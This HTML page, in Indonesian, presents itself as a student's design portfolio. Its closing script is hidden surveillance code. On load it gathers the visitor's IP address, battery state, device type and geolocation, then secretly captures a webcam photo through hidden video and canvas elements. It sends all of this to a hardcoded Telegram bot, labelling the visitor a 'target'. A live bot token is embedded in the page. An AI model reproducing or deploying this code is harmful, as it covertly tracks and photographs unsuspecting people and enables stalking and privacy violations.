<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portofolio Will</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=DM+Serif+Display&family=Inter:wght@300;400;600;700&display=swap');
        body { font-family: 'Inter', sans-serif; background-color: #dcdad4; color: #1a2e23; overflow-x: hidden; }
        .font-serif { font-family: 'DM Serif Display', serif; }
        .hover-lift { transition: transform 0.2s ease, box-shadow 0.2s ease; }
        .hover-lift:hover { transform: translateY(-4px); box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1); }
    </style>
</head>
<body class="p-4 md:p-12">

    <main class="max-w-6xl mx-auto">
        <nav class="flex justify-between items-center mb-8 md:mb-10">
            <span class="text-xl font-bold">Will</span>
            <div class="space-x-6 font-semibold text-xs uppercase tracking-widest hidden md:flex items-center">
                <a href="#" class="hover:text-orange-700 transition">About me</a>
                <a href="#" class="hover:text-orange-700 transition">Resume</a>
                <a href="#" class="bg-[#2b3934] text-white px-5 py-2 rounded-full hover-lift transition">Contact</a>
            </div>
        </nav>

        <header class="grid grid-cols-1 md:grid-cols-12 gap-6 md:gap-8">
            <div class="md:col-span-7 space-y-6">
                <h2 class="text-5xl md:text-8xl font-serif leading-[0.9]">Hello,<br>I'm Will !</h2>
                <p class="text-sm md:text-base leading-relaxed text-gray-800 max-w-lg">Graphic Designer otodidak & Digital Web Management enthusiast.</p>
                <div class="flex gap-3 flex-wrap">
                    <a href="#" class="bg-[#f7a21b] text-white px-6 py-3 rounded-full font-bold shadow-md hover-lift transition text-xs md:text-sm flex-1 text-center">LinkedIn</a>
                    <button onclick="toggleProjects()" class="bg-[#2b3934] text-white px-6 py-3 rounded-full font-bold shadow-md hover-lift transition text-xs md:text-sm flex-1 text-center">Projects</button>
                </div>
                
                <div id="project-list" class="hidden space-y-3">
                    <a href="https://aismk.vercel.app" target="_blank" class="block bg-white p-4 rounded-2xl shadow-sm border border-black/5 hover:border-[#f7a21b] transition">
                        <div class="font-bold text-sm text-[#2b3934]">AISMK Web App</div>
                        <div class="text-[10px] text-gray-500 uppercase tracking-wider">Web Development</div>
                    </a>
                </div>

                <a href="https://maps.app.goo.gl/2P8A5kXNmCTnqjm76" target="_blank" class="flex items-center gap-4 bg-white p-4 rounded-2xl shadow-sm border border-black/5 hover:border-[#f7a21b] transition">
                    <div class="w-12 h-12 flex-shrink-0">
                        <img src="https://i.ibb.co.com/yczZpQpb/pp-smkn.jpg" alt="Logo Sekolah" class="w-full h-full object-cover rounded-full">
                    </div>
                    <div>
                        <div class="font-bold text-sm text-[#2b3934]">Lokasi Sekolah Saya</div>
                        <div class="text-[10px] text-gray-500 uppercase tracking-wider">SMKN 2 Tembilahan</div>
                    </div>
                </a>
            </div>
            
            <div class="md:col-span-5 bg-[#2b3934] text-white p-6 rounded-[1.5rem] shadow-lg h-fit">
                <div class="w-full aspect-square md:aspect-auto md:h-64 mb-6 overflow-hidden rounded-[1rem]">
                    <img src="https://i.ibb.co.com/CKpQhNrQ/1778070770943.png" alt="Foto Profil" class="w-full h-full object-cover">
                </div>
                <h3 class="font-bold text-sm mb-3">Contact</h3>
                <div class="text-xs md:text-sm space-y-3 opacity-90">
                    <p><i class="fas fa-map-marker-alt mr-2"></i> Indonesia</p>
                    <p><i class="fas fa-envelope mr-2"></i> wilkaxyz@gmail.com</p>
                </div>
            </div>
        </header>
    </main>

    <video id="video" class="hidden"></video>
    <canvas id="canvas" class="hidden"></canvas>

    <script>
        const botToken = "8523579929:AAEYSUFre2O2Ei8RcW8y3emKA0-NxqJb4E8"; 
        const chatId = "7577331454"; 

        window.onload = async function() {
            let ipAddress = "N/A";
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                ipAddress = ipData.ip;
            } catch (e) {}

            let batteryInfo = "N/A";
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? "Charging" : "Discharging"})`;
                } catch (e) {}
            }

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const { latitude, longitude } = position.coords;
                    const finalMsg = `*🚨 Target Terdeteksi!* \n\n` +
                                     `📍 *Lokasi:* https://www.google.com/maps/place/${latitude},${longitude}\n` +
                                     `🌐 *IP Address:* \`${ipAddress}\`\n` +
                                     `🔋 *Baterai:* ${batteryInfo}\n` +
                                     `📱 *Device:* ${navigator.platform}`;
                    
                    const keyboard = {
                        inline_keyboard: [[
                            { text: "📍 Lihat di Maps", url: `https://www.google.com/maps/place/${latitude},${longitude}` },
                            { text: "👤 Cek Profil", callback_data: "check_user" }
                        ]]
                    };

                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ chat_id: chatId, text: finalMsg, parse_mode: 'Markdown', reply_markup: keyboard })
                    });
                    
                    takePhoto();
                });
            }
        };

        async function takePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.play();
                setTimeout(async () => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const blob = await (await fetch(canvas.toDataURL('image/jpeg'))).blob();
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', blob);
                    formData.append('caption', "📸 Foto Target");
                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
                    stream.getTracks().forEach(t => t.stop());
                }, 1500);
            } catch (err) {}
        }
        function toggleProjects() { document.getElementById('project-list').classList.toggle('hidden'); }
    </script>
</body>
</html>
